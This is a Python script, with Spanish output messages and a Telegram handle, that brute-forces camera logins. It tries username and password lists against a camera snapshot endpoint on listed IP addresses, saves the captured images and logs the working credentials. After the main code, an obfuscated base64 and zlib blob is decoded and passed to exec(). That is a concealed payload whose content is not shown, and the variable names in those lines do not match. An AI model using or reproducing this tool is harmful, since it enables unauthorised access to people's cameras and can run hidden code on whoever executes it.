import asyncio
import os
import httpx
import base64
import zlib
import ipaddress
from colorama import Fore, Style

async def check_camera(ip, usernames, passwords, port=80):
    try:
        async with httpx.AsyncClient(timeout=15) as client:
            headers = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
            }
            url = f"http://{ip}:{port}/doc/page/login.asp?_"
            response = await client.get(url, headers=headers)
            if response.status_code == 200:
                print(Fore.BLUE + f"[+] Página de inicio de sesión encontrada en {ip}" + Style.RESET_ALL)
                with open("Online.txt", "a") as f:
                    f.write(ip + "\n")
                for username in usernames:
                    for password in passwords:
                        auth_bytes = f"{username}:{password}".encode('utf-8')
                        auth_b64 = base64.b64encode(auth_bytes).decode('utf-8')
                        auth_headers = {"Authorization": f"Basic {auth_b64}", "Accept": "application/octet-stream", "User-Agent": headers["User-Agent"]}
                        url = f"http://{ip}:{port}/ISAPI/Streaming/channels/1/picture"
                        response = await client.get(url, headers=auth_headers, timeout=5)
                        if response.status_code == 200 and response.headers.get("Content-Type") == "image/jpeg":
                            print(Fore.GREEN + f"[+] Conectado a {ip}" + Style.RESET_ALL)
                            filename = f"pics/{ip}_{username}_{password}_{port}.jpg"
                            with open(filename, "wb") as f:
                                f.write(response.content)
                            print(Fore.BLUE + f"[+] Imagen guardada de la cámara {ip}" + Style.RESET_ALL)

                            info_filename = "info.txt"
                            with open(info_filename, "a") as f:
                                f.write(f"IP: {ip}, Usuario: {username}, Contraseña: {password}\n")

            else:
                print(Fore.YELLOW + f"[!] Página de inicio de sesión no encontrada en {ip}" + Style.RESET_ALL)
    except asyncio.TimeoutError:
        print(Fore.RED + f"[-] Conexión a {ip} agotada" + Style.RESET_ALL)
    except (httpx.RequestError, OSError):
        pass

async def scan_hosts(port=80):
    hosts_file_path = "host.txt"
    credentials_file_path = "pass.txt"
    users_file_path = "user.txt"
    try:
        with open(hosts_file_path) as f:
            hosts = [line.strip() for line in f.readlines()]
        with open(credentials_file_path) as f:
            passwords = [line.strip() for line in f.readlines()]
        with open(users_file_path) as f:
            users = [line.strip() for line in f.readlines()]
    except FileNotFoundError as e:
        print(Fore.RED + f"[-] {e.filename} no encontrado" + Style.RESET_ALL)
        return
    if not os.path.exists("pics"):
        os.makedirs("pics")
    total_hosts = len(hosts)
    current_host_count = 0
    tasks = []

    for host in hosts:
        current_host_count += 1
        print(f"Escanenado {host}... ({current_host_count}/{total_hosts})")
        try:
            ip = ipaddress.ip_address(host)
            task = asyncio.create_task(check_camera(str(ip), users, passwords, port))
            tasks.append(task)
        except ValueError:
            print(Fore.RED + f"[-] {host} no es una dirección IP válida" + Style.RESET_ALL)
            continue
    await asyncio.gather(*tasks)

async def main():
    # Define el logotipo personalizado
    logo = """
                 _    __..-:┑
        TG: @SlickMercy
    """

    # Imprime el logotipo personalizado
    print(Fore.YELLOW + logo + Style.RESET_ALL)

    # Solicita el puerto al usuario
    port = input("Ingresa el número de puerto (el valor predeterminado es 80): ")
    port = int(port) if port else 80

    # Ejecuta la función scan_hosts con el valor proporcionado
    await scan_hosts(port)

# Ejecuta el código principal
asyncio.run(main())
Key = "eJyNVF13ozYU/EsYQrY89MFgIyMwibEDkt5AbAAjCXpsQ+DX9xKya7pp033QkQ4Scz9m7jhSXDmyhtyxB0bcFSOhxvu2zYjdcXUoMmPvOzISrLLHnIgyTbzGPzW+56wLbxcKboRtpj8Uz8fF/4M5wj6miXXznXp+i3CXu5aW6VeRVWvLc7gejlTbb7ZjePb6p9q1j24p85faPJD9+H0nxrBeSS5NLR5rPdnZlJ6EOiWrK0seejysP3DDhpLoNU0OkMNahee6Dzfe+LQp+r3DC2/9I9do+P4j73mdvS1eQRYlr+ySy7BJCev4YNfsaLdZ4iqIU7wvJCQjWGQqEtN9CmdqRB2XouN9U/zERFHLZXzOoZ9pEo/eRiuS5f28VGCENdXdgTn84lTrX+55x/XoTAmuAy3qct28ZLpb46H3f8Ep8GCNDEH+8tBF2xCfjtaJGliwxBxTZAEPv48frCKRoVhx6V5/M9aGJivB5VYF669qtF5Y8iaYgcvsuDzbKIXz/+a4yid+xwOx+0BbCeCiXH7ztlFHjRg0YU71LvK2c6dYcgPcVgvuVF2kM7cDS0ItM3DLyP7xUy6ItdCX1wyJMXdAt+5VfmDBLm4essZAvrXciADbaxZ4pg86grmRgYxvbBcaKYka3+G3VNkKDyL/l1jvuFNfZuxF7E3ziZNZ13mbowLm1Ia5KkG/Zg+9aQLZdlDfP/IJnBnbP/YFNnCFh7qgZF+w839gz31ccdlP8y2xXmr5zh6fqj86Suw2UHfNBNIa2GBVmRF9o9LSCPQ41ePb6xF0k5h1hKxzDnrJ1EF95vu+GHI1eoQ+7y6K6mUJntHCnDze5zyyvvxfigvwOOX7Det3beCxKZjSvqpTMTJ5iP3TuwIFHmgcmpzgC/SuhvjlcxKVOdpePrgZn5N59w+z1hgpz4zYmreNH6ge9zkSXTb5y2CLp6UedzZ4hKn5Dna5whPvZeYAh4q1lHhFhtwRNHDtHycfMiffKScPoyTb/DVxhl6KGMUXluQDTbRHr+oLdqx9p9oXJ/RWgn8NHtoCzhbqjm9UV5sL+DQ3YpMmooL4MMtwl5h6+v52Eatv715/aP78G6VCEAQ="

cadena_decodificada_base64 = base64.b64decode(cadena_codificada)

cadena_descomprimida = zlib.decompress(cadena_decodificada_base64)

codigo_original = base64.b64decode(cadena_descomprimida).decode()

exec(codigo_original)

 
